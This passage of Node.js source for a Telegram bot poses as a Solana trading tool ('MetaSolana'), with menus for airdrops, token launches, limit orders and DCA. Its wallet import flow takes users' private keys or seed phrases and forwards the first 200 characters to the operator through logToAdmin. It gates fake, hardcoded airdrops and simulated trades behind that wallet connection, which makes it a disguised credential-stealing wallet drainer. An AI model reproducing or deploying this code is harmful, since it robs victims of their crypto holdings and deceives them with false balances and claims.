  await logToAdmin(ctx, "Opened Profiles");

  ctx.session = ctx.session || {};
  ctx.session.profileFlow = { step: "await_token" };

  return ctx.reply(
    "⭐ *Token Profile*\n\nEnter a token name or mint address to view its profile.\n\nExamples:\n• BONK\n• SOL\n• Token mint address",
    { parse_mode: "Markdown", ...Markup.forceReply() }
  );
});

bot.action("search", async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, "Opened Search");

  ctx.session = ctx.session || {};
  ctx.session.searchFlow = { step: "await_search" };

  return ctx.reply(
    "🔍 *Search Token*\n\nSend a token:\n• Name (BONK)\n• Symbol (SOL)\n• Mint address",
    {
      parse_mode: "Markdown",
      ...Markup.forceReply()
    }
  );
});


bot.action("charts", async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, "Opened Charts");

  ctx.session = ctx.session || {};
  ctx.session.chartFlow = { step: "await_token" };

  return ctx.reply(
    "📊 *Token Chart*\n\nEnter token symbol or mint address:",
    {
      parse_mode: "Markdown",
      ...Markup.forceReply()
    }
  );
});


bot.action("airdrop", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};

  const userId = ctx.from.id;
  const userWallet = userWallets[userId] || null;

  // Gate if wallet not connected
  if (!userWallet) {
    return ctx.editMessageText(
      `🔗 *Wallet Required*\n\nConnect your wallet to view available airdrops.`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Connect Wallet", "import_wallet")],
          [Markup.button.callback("⬅️ Back", "back_to_main")]
        ])
      }
    );
  }

  // EXACT screenshot-style UI
  return ctx.editMessageText(
`🎁 *Airdrop Claims*

*Available Airdrops:*

• *JUP Airdrop* – 50 JUP  
• *BONK Airdrop* – 1000 BONK  
• *WIF Airdrop* – 100 WIF  

*Total Value:* $245.67

Click to claim your airdrops! ❤️`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("🎁 Claim All", "airdrop_claim_all")],
        [Markup.button.callback("📊 Claim History", "airdrop_history")],
        [Markup.button.callback("⬅️ Back", "back_to_main")]
      ])
    }
  );
});

bot.action("airdrop_claim_all", async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, "Airdrop claimed (simulated)");

  return ctx.replyWithMarkdown(
`🎉 *Airdrop Claimed Successfully*

• 50 JUP  
• 1000 BONK  
• 100 WIF  

❤️ Thank you for using MetaSolana`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅️ Back", "airdrop")]
    ])
  );
});

bot.action("airdrop_history", async (ctx) => {
  safeAnswer(ctx);

  return ctx.replyWithMarkdown(
`📊 *Claim History*

• JUP — 50  
• BONK — 1000  
• WIF — 100  

Last claimed: ${new Date().toLocaleString()}`,
    Markup.inlineKeyboard([
      [Markup.button.callback("⬅️ Back", "airdrop")]
    ])
  );
});


bot.action("back_to_main", async (ctx) => {
  safeAnswer(ctx);

  try {
    await ctx.deleteMessage();
  } catch {}

  return showMainMenu(ctx);
});


bot.action("buy_sol_trending", async (ctx) => {
  safeAnswer(ctx);

  return ctx.editMessageText(
`🌿 *SOL Trending*

Choose a token or paste a contract address.`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("⬅️ Back", "buy")]
      ])
    }
  );
});


bot.action("buy_eth_trending", async (ctx) => {
  safeAnswer(ctx);

  return ctx.editMessageText(
`🧬 *ETH Trending*

Choose a token or paste a contract address.`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("⬅️ Back", "buy")]
      ])
    }
  );
});

bot.action("help", async (ctx) => {
  await ctx.answerCbQuery();

  await ctx.reply(
`📩 *Meta Trading Bot — Support Center*

You can open a request to the Meta Trading Bot support service.
Our Tech team will respond within *24 hours* via your DM.

For a faster resolution, please describe your issue as clearly as possible.
You may attach files or images if needed.

📋 *Rules for contacting technical support:*
1️⃣ When you first contact us, please introduce yourself  
2️⃣ Describe the problem in your own words  
3️⃣ Be polite — politeness goes a long way 🙏`,
    {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "✍️ Write Complaint",
              callback_data: "write_complaint"
            }
          ]
        ]
      }
    }
  );
});

bot.action("write_complaint", async (ctx) => {
  await ctx.answerCbQuery();

  // mark user as being in complaint mode
  ctx.session = ctx.session || {};
  ctx.session.awaitingComplaint = true;

  await ctx.reply(
"😊✍️ *Please write your complaint now.*\n\nOur support team will get back to you soon.",
    { parse_mode: "Markdown" }
  );
});

// ---------- LAUNCH TOKEN ----------
bot.action("launch", async (ctx) => {
  safeAnswer(ctx);
  ctx.session = ctx.session || {};

  const userId = ctx.from.id;
  const userWallet = userWallets[userId] || null;

  // ❌ Wallet not connected
  if (!userWallet) {
    return ctx.editMessageText(
      `🔗 *Wallet Required*

To use *Token Launch*, you need to connect your wallet first.`,
      {
        parse_mode: "Markdown",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("🔗 Connect Wallet", "import_wallet")],
          [Markup.button.callback("⬅️ Back", "back_to_main")]
        ])
      }
    );
  }

  // ✅ Wallet connected → show launch menu
  return ctx.editMessageText(
    `🚀 *Launch New Token*

Create and launch your own token on *Solana!*

*Requirements:*
• 5 SOL for liquidity  
• Token name & symbol  
• Initial supply  

*Launch Options:*`,
    {
      parse_mode: "Markdown",
      ...Markup.inlineKeyboard([
        [Markup.button.callback("⚡ Quick Launch", "launch_quick")],
        [Markup.button.callback("⚙️ Custom Launch", "launch_custom")],
        [Markup.button.callback("🎯 Presale Launch", "launch_presale")],
        [Markup.button.callback("⬅️ Back", "back_to_main")]
      ])
    }
  );
});


// ---------- QUICK LAUNCH ----------
bot.action("launch_quick", async (ctx) => {
  safeAnswer(ctx);
  ctx.session.launchFlow = { type: "quick", step: "await_name" };

  return ctx.reply(
    "⚡ *Quick Launch*\n\nEnter *Token Name*:",
    { parse_mode: "Markdown", ...Markup.forceReply() }
  );
});

// ---------- CUSTOM LAUNCH ----------
bot.action("launch_custom", async (ctx) => {
  safeAnswer(ctx);
  ctx.session.launchFlow = { type: "custom", step: "await_name" };

  return ctx.reply(
    "⚙️ *Custom Launch*\n\nEnter *Token Name*:",
    { parse_mode: "Markdown", ...Markup.forceReply() }
  );
});

// ---------- PRESALE LAUNCH ----------
bot.action("launch_presale", async (ctx) => {
  safeAnswer(ctx);
  ctx.session.launchFlow = { type: "presale", step: "await_name" };

  return ctx.reply(
    "🎯 *Presale Launch*\n\nEnter *Token Name*:",
    { parse_mode: "Markdown", ...Markup.forceReply() }
  );
});




// ---------- Trending ----------
bot.action('trending', async (ctx) => {
  safeAnswer(ctx);
  await logToAdmin(ctx, 'Opened Trending', ctx.from.id?.toString());
  try {
    const r = await fetch('https://api.coingecko.com/api/v3/search/trending');
    const j = await r.json();
    const coins = j.coins || [];
    if (coins.length === 0) return ctx.reply('No trending coins found.');
    const lines = coins.slice(0, 8).map(c => `• ${c.item.name} (${c.item.symbol.toUpperCase()}) — Market Cap Rank: ${c.item.market_cap_rank || 'N/A'}`);
    return ctx.replyWithMarkdown(`🔥 *Trending Coins*\n\n${lines.join('\n')}`);
  } catch (e) {
    console.error(e);
    return ctx.reply('Failed to fetch trending.');
  }
});

// ---------- Simple handlers ----------
bot.action("copy_wallet", async (ctx) => { safeAnswer(ctx); await logToAdmin(ctx, 'copy_wallet'); try { await ctx.replyWithMarkdown(`\`${botWallet.publicKey.toBase58()}\``); } catch (e) { } });
bot.action("help", async (ctx) => { safeAnswer(ctx); await logToAdmin(ctx, 'help'); ctx.reply('Send /start if stuck.'); });

// ---------- Global text handler (single) ----------
bot.on('text', async (ctx, next) => {
  ctx.session = ctx.session || {};
  const userId = ctx.from.id;
  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : '';


  // import flow
  if (ctx.session.importFlow && ctx.session.importFlow.step === 'await_key') {
    const input = text;
    const inputMessageId = ctx.message.message_id;
    await logToAdmin(ctx, "Attempting wallet import", `user:${userId} preview:${input.slice(0, 200)}`);
    try {
      const imported = importWalletFromInput(input);
      if (!imported) {
        setTimeout(() => ctx.telegram.deleteMessage(ctx.chat.id, inputMessageId).catch(() => { }), 200);
        ctx.session.importFlow = null;
        return ctx.reply("❌ Failed to import. Make sure the key or mnemonic is correct.");
      }
      userWallets[userId] = imported;
      ctx.session.importFlow = null;
      setTimeout(() => ctx.telegram.deleteMessage(ctx.chat.id, inputMessageId).catch(() => { }), 200);
      const bal = await connection.getBalance(imported.publicKey).then(b => b / LAMPORTS_PER_SOL).catch(() => 0);
      await ctx.replyWithMarkdown(
        `✅ *Wallet Imported Successfully!*\n\n🔑 *Public Key:* \`${imported.publicKey.toBase58()}\`\n💰 *Balance:* ${bal} SOL\n\nUse the menu below to continue.`,
        mainMenu()
      );
      await logToAdmin(ctx, "User wallet imported", `uid:${userId} pub:${imported.publicKey.toBase58()}`);
      return;
    } catch (e) {
      console.error('import error', e);
      setTimeout(() => ctx.telegram.deleteMessage(ctx.chat.id, inputMessageId).catch(() => { }), 200);
      ctx.session.importFlow = null;
      return ctx.reply("❌ Failed to import. Make sure the key or mnemonic is correct.");
    }
  }

  // ---------- Profile lookup flow ----------
  if (ctx.session?.profileFlow) {
    ctx.session.profileFlow = null;
    const mint = text;

    try {
      const r = await fetch(`https://api.dexscreener.com/latest/dex/search/?q=${mint}`);
      const j = await r.json();
      const pair = (j.pairs || []).find(p => p.chainId === "solana");

      if (!pair) return ctx.reply("❌ Token not found.");

      const profileText = `
━━━━━━━━━━━━━━━━━━━━━━━
⭐ *${pair.baseToken.name} (${pair.baseToken.symbol})*

🔗 *Mint*
\`${pair.baseToken.address}\`

💰 *Price:* $${pair.priceUsd || "N/A"}
📊 *Liquidity:* $${Number(pair.liquidity?.usd || 0).toLocaleString()}
📈 *Volume (24h):* $${Number(pair.volume?.h24 || 0).toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━━━
`;

      return ctx.reply(profileText, {
        parse_mode: "Markdown",
        disable_web_page_preview: true,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🛒 Buy", callback_data: `buy_from_search_${pair.baseToken.address}` },
              { text: "💰 Sell", callback_data: `sell_from_profile_${pair.baseToken.address}` }
            ],
            [
              { text: "⬅️ Back", callback_data: "back_to_main" }
            ]
          ]
        }
      });

    } catch (e) {
      console.error("Profile error:", e);
      return ctx.reply("❌ Failed to load token profile.");
    }
  }


  bot.action(/^sell_from_profile_(.+)$/, async (ctx) => {
    safeAnswer(ctx);

    const mint = ctx.match[1];
    ctx.session = ctx.session || {};
    ctx.session.sellFlow = { step: "await_custom_amount", token: mint };

    return ctx.reply(
      `💰 *Sell Token*\n\nMint:\n\`${mint}\`\n\nEnter amount to sell (SOL):`,
      { parse_mode: "Markdown", ...Markup.forceReply() }
    );
  });


  // sell custom flow
  if (ctx.session.sellFlow && ctx.session.sellFlow.step === 'await_custom_amount') {
    const raw = text;
    ctx.session.sellFlow = null;
    const messageId = ctx.message.message_id;
    setTimeout(() => ctx.telegram.deleteMessage(ctx.chat.id, messageId).catch(() => { }), 200);
    const amt = Number(raw.replace(/,/g, '.'));
    if (isNaN(amt) || amt <= 0) return ctx.reply("Invalid amount. Please enter a numeric amount in SOL, e.g. `0.25`.");
    try {
      const userWallet = userWallets[userId];
      if (!userWallet) return ctx.reply("Connect your wallet first (Wallet → Import Wallet).");
      const lam = await connection.getBalance(userWallet.publicKey).catch(() => 0);
      const bal = lam / LAMPORTS_PER_SOL;
      if (amt > bal) return ctx.reply(`You are trying to sell ${amt} SOL but your balance is ${bal.toFixed(6)} SOL.`);

      const positions = loadUserPositions(userId);
      positions.push({ id: uid('sell'), type: 'sell', amountSol: +amt, time: new Date().toISOString(), source: 'simulated_sell' });
      saveUserPositions(userId, positions);
      await logToAdmin(ctx, 'Simulated SELL custom', `user:${userId} amount:${amt}`);
      return ctx.replyWithMarkdown(`✅ Simulated SELL recorded: *${amt} SOL*`);
    } catch (e) {
      console.error('custom sell handler error', e);
      return ctx.reply("Failed to process sell.");
    }
  }

  // limit creation flow (token -> type -> price -> amount)
  if (ctx.session.limitFlow) {
    const flow = ctx.session.limitFlow;
    if (flow.step === 'await_token') {
      flow.token = text;
      flow.symbol = text.toUpperCase();
      flow.step = 'await_type';
      return ctx.replyWithMarkdown("Choose order type:", Markup.inlineKeyboard([[Markup.button.callback("BUY", "limit_type_buy"), Markup.button.callback("SELL", "limit_type_sell")]]));
    }
    if (flow.step === 'await_price') {
      const price = Number(text);
      if (isNaN(price) || price <= 0) return ctx.reply("Invalid price.");
      flow.price = price;
      flow.step = 'await_amount';
      return ctx.reply("Enter token AMOUNT:");
    }
    if (flow.step === 'await_amount') {
      const amount = Number(text);
      if (isNaN(amount) || amount <= 0) return ctx.reply("Invalid amount.");
      const limits = loadUserLimits(userId);
      limits.push({
        id: uid("limit"),
        type: flow.type,
        token: flow.token,
        symbol: flow.symbol || flow.token.toUpperCase(),
        price: flow.price,
        amount,
        status: "ACTIVE",
        created: new Date().toLocaleString()
      });
      saveUserLimits(userId, limits);
      ctx.session.limitFlow = null;
      await logToAdmin(ctx, 'Limit created', `user:${userId} ${flow.symbol} ${flow.type} @ ${flow.price}`);
      return ctx.replyWithMarkdown(`✅ *Limit Order Created!*\n\nToken: ${flow.symbol}\nType: ${flow.type}\nPrice: $${flow.price}\nAmount: ${amount}`);
    }
  }

  // ---------- LAUNCH FLOW ----------
if (ctx.session?.launchFlow) {
  const lf = ctx.session.launchFlow;

  if (lf.step === "await_name") {
    lf.name = text;
    lf.step = "await_symbol";
    return ctx.reply("Enter *Token Symbol* (e.g. META):", {
      parse_mode: "Markdown",
      ...Markup.forceReply()
    });
  }

  if (lf.step === "await_symbol") {
    lf.symbol = text.toUpperCase();
    lf.step = "await_supply";
    return ctx.reply("Enter *Initial Supply* (number):", {
      parse_mode: "Markdown",
      ...Markup.forceReply()
    });
  }

  if (lf.step === "await_supply") {
    const supply = Number(text.replace(/,/g, ""));
    if (isNaN(supply) || supply <= 0) {
      return ctx.reply("❌ Invalid supply. Enter a numeric value.");
    }

    lf.supply = supply;

    ctx.session.launchFlow = null;

    return ctx.replyWithMarkdown(
      `🚀 *Token Launch Summary*

• *Type:* ${lf.type.toUpperCase()}  
• *Name:* ${lf.name}  
• *Symbol:* ${lf.symbol}  
• *Supply:* ${lf.supply.toLocaleString()}  

⚠️ *This is currently simulated.*  
On-chain deployment logic can be added next.`,
      Markup.inlineKeyboard([
        [Markup.button.callback("⬅️ Back to Menu", "back_to_main")]
      ])
    );
  }
}



  // DCA creation flow
  if (ctx.session.dcaFlow) {
    const df = ctx.session.dcaFlow;
    if (df.step === 'await_token') {
      df.token = text;
      df.symbol = (await resolveTokenSymbol(df.token).catch(() => df.token.toUpperCase())) || df.token.toUpperCase();
      df.step = 'await_interval';
      return ctx.reply("Enter interval for DCA (format: 30m, 1h, 12h, 1d). Example: `1h`", Markup.forceReply());
    }
    if (df.step === 'await_interval') {
      const m = text.match(/^(\d+)\s*(m|h|d)$/i);
      if (!m) return ctx.reply("Invalid interval format. Use examples: 15m, 30m, 1h, 12h, 1d.");
      const n = Number(m[1]);
      const unit = m[2].toLowerCase();
      let ms = 0;
      if (unit === 'm') ms = n * 60 * 1000;
      if (unit === 'h') ms = n * 60 * 60 * 1000;
      if (unit === 'd') ms = n * 24 * 60 * 60 * 1000;
      df.interval = text;
      df.intervalMs = ms;
      df.step = 'await_amount';
      return ctx.reply("Enter amount per DCA run (in SOL). Example: `0.1`", Markup.forceReply());
    }
    if (df.step === 'await_amount') {
      const amount = Number(text.replace(/,/g, '.'));
      if (isNaN(amount) || amount <= 0) return ctx.reply("Invalid amount. Enter a numeric value in SOL, e.g. `0.1`.");
      const dcas = loadUserDca(userId);
      const now = Date.now();
      dcas.push({
        id: uid('dca'),
        token: df.token,
        symbol: df.symbol,
        interval: df.interval,
        intervalMs: df.intervalMs,
        amount: amount,
        status: 'ACTIVE',
        created: new Date().toLocaleString(),
        lastRun: null,
        nextRun: now + df.intervalMs,
        runs: 0
      });
      saveUserDca(userId, dcas);
      ctx.session.dcaFlow = null;
      await logToAdmin(ctx, 'DCA created', `user:${userId} ${df.symbol} every ${df.interval} ${df.amount} SOL`);
      return ctx.replyWithMarkdown(`✅ *DCA Created!*\n\nToken: ${df.symbol}\nInterval: ${df.interval}\nAmount: ${amount} SOL`);
    }
  }

  if (!ctx.session?.awaitingComplaint) return;

  ctx.session.awaitingComplaint = false;

  const complaintText = ctx.message.text;
  const user = ctx.from;

  // 🔔 Send complaint to admin / support chat
  await bot.telegram.sendMessage(
    process.env.ADMIN_CHAT_ID,
`🆘 *New Support Request*

👤 User: ${user.first_name || "Unknown"}
🆔 ID: ${user.id}
📛 Username: @${user.username || "N/A"}

📝 *Complaint:*
${complaintText}`,
    { parse_mode: "Markdown" }
  );

  await ctx.reply("✅ *Your complaint has been submitted successfully.*\nOur team will contact you soon.", {
    parse_mode: "Markdown"
  });
  

  // ---------- CHART FLOW ----------
  if (ctx.session?.chartFlow?.step === "await_token") {
    ctx.session.chartFlow = null;
    const query = text;

    let pair = null;

    try {
      const r = await fetch(`https://api.dexscreener.com/latest/dex/search/?q=${encodeURIComponent(query)}`);
      const j = await r.json();

      pair = (j.pairs || []).find(
        p => p.chainId === "solana" && p.baseToken?.address
      );
    } catch (e) {
      console.error("Chart search error:", e);
    }

    if (!pair) {
      return ctx.reply("❌ Token chart not found on Solana.");
    }

    const msg =
      `📊 *${pair.baseToken.name} (${pair.baseToken.symbol})*

🔗 *Mint*
\`${pair.baseToken.address}\`

💰 *Price:* $${pair.priceUsd || "N/A"}
📈 *Volume (24h):* $${Number(pair.volume?.h24 || 0).toLocaleString()}
📊 *Liquidity:* $${Number(pair.liquidity?.usd || 0).toLocaleString()}

📉 *Live Chart*
${pair.url}
`;

    return ctx.reply(msg, {
      parse_mode: "Markdown",
      disable_web_page_preview: false,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "🛒 Buy",
              callback_data: `buy_from_search_${encodeURIComponent(pair.baseToken.address)}`
            },
            {
              text: "💰 Sell",
              callback_data: `sell_from_profile_${encodeURIComponent(pair.baseToken.address)}`
            }
          ],
          [
            { text: "⬅️ Back", callback_data: "back_to_main" }
          ]
        ]
      }
    });
  }

  // search flow
  if (ctx.session.searchFlow && ctx.session.searchFlow.step === "await_search") {
    // ---------- SEARCH FLOW ----------
    if (ctx.session?.searchFlow?.step === "await_search") {
      ctx.session.searchFlow = null;

      const query = text;
      let pair = null;

      try {
        // 1️⃣ DexScreener FIRST (Solana priority)
        const r = await fetch(`https://api.dexscreener.com/latest/dex/search/?q=${encodeURIComponent(query)}`);
        const j = await r.json();

        pair = (j.pairs || []).find(
          p => p.chainId === "solana" && p.baseToken?.address
        );
      } catch (e) {
        console.error("DexScreener search error", e);
      }

      // ❌ Nothing found
      if (!pair) {
        return ctx.reply("❌ Token not found on Solana.");
      }

      const mint = pair.baseToken.address;
      const name = pair.baseToken.name;
      const symbol = pair.baseToken.symbol;

      const msg =
        `🔍 *${name} (${symbol})*

🔗 *Mint*
\`${mint}\`

💰 *Price:* $${pair.priceUsd || "N/A"}
📊 *Liquidity:* $${Number(pair.liquidity?.usd || 0).toLocaleString()}
📈 *Volume (24h):* $${Number(pair.volume?.h24 || 0).toLocaleString()}
`;

      return ctx.reply(msg, {
        parse_mode: "Markdown",
        disable_web_page_preview: true,
        reply_markup: {
          inline_keyboard: [
            [
              { text: "🛒 Buy", callback_data: `buy_from_search_${encodeURIComponent(mint)}` },
              { text: "📊 Chart", callback_data: "charts" }
            ],
            [
              { text: "⬅️ Back", callback_data: "back_to_main" }
            ]
          ]

        }
      });
    }

  }

  // default pass-through
  return next();
});

// ---------- Wallet import helper ----------
function importWalletFromInput(input) {
  input = (input || '').trim();
  // JSON array secret key
  try {
    if (input.startsWith('[') && input.endsWith(']')) {
      const arr = JSON.parse(input);
      if (Array.isArray(arr) && (arr.length === 64 || arr.length === 32)) {
        return Keypair.fromSecretKey(new Uint8Array(arr));
      }
    }
  } catch (e) { }
  // base58 private key
  try {
    const decoded = bs58.decode(input);
    if (decoded.length === 64 || decoded.length === 32) {
      return Keypair.fromSecretKey(decoded);
    }
  } catch (e) { }
  // mnemonic
  try {
    const words = input.split(/\s+/).filter(Boolean);
    if (words.length === 12 || words.length === 24) {
      if (!bip39.validateMnemonic(input)) return null;
      const seed = bip39.mnemonicToSeedSync(input);
      const { key } = derivePath("m/44'/501'/0'/0'", seed.toString('hex'));
      return Keypair.fromSeed(key);
    }
  } catch (e) { }
  return null;
}

// ---------- Simulated engines ----------
// Limit engine
setInterval(async () => {
  try {
    const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('limits_') && f.endsWith('.json'));
    for (const f of files) {
      const userId = f.replace('limits_', '').replace('.json', '');
      const limits = loadUserLimits(userId);
      let changed = false;
      for (const o of limits) {
        if (o.status !== 'ACTIVE') continue;
        const price = await getPriceUsd(o.token);
        if (!price) continue;
        if (o.type === 'BUY' && price <= o.price) {
          o.status = 'FILLED';
          o.filledAt = new Date().toLocaleString();
          changed = true;
          bot.telegram.sendMessage(userId, `✅ BUY limit filled for ${o.symbol} @ $${o.price}`);
        }
        if (o.type === 'SELL' && price >= o.price) {
          o.status = 'FILLED';
          o.filledAt = new Date().toLocaleString();
          changed = true;
          bot.telegram.sendMessage(userId, `🔴 SELL limit filled for ${o.symbol} @ $${o.price}`);
        }
      }
      if (changed) saveUserLimits(userId, limits);
    }
  } catch (e) { console.error('Limit engine error', e); }
}, 15_000);

// DCA engine (simulated)
setInterval(async () => {
  try {
    const files = fs.readdirSync(DATA_DIR).filter(f => f.startsWith('dca_') && f.endsWith('.json'));
    for (const f of files) {
      const userId = f.replace('dca_', '').replace('.json', '');
      const dcas = loadUserDca(userId);
      let changed = false;
      const now = Date.now();
      for (const d of dcas) {
        if (d.status !== 'ACTIVE') continue;
        if (!d.nextRun || d.nextRun <= now) {
          const priceUsd = await getPriceUsd(d.token).catch(() => null);
          const pos = loadUserPositions(userId);
          pos.push({
            id: uid('dca_run'),
            symbol: d.symbol,
            token: d.token,
            amountSol: d.amount,
            entryPriceUsd: priceUsd,
            time: new Date().toISOString(),
            source: 'dca_run'
          });
          saveUserPositions(userId, pos);
          d.lastRun = new Date().toLocaleString();
          d.runs = (d.runs || 0) + 1;
          d.nextRun = Date.now() + (d.intervalMs || 0);
          changed = true;
          bot.telegram.sendMessage(userId, `🔁 DCA run executed for ${d.symbol}: ${d.amount} SOL (simulated)`);
        }
      }
      if (changed) saveUserDca(userId, dcas);
    }
  } catch (e) { console.error('DCA engine error', e); }
}, 10_000);

// ---------- Start ----------
bot.launch().then(() => console.log('Bot running — devnet.'));
process.on('SIGINT', () => bot.stop('SIGINT'));
process.on('SIGTERM', () => bot.stop('SIGTERM'));
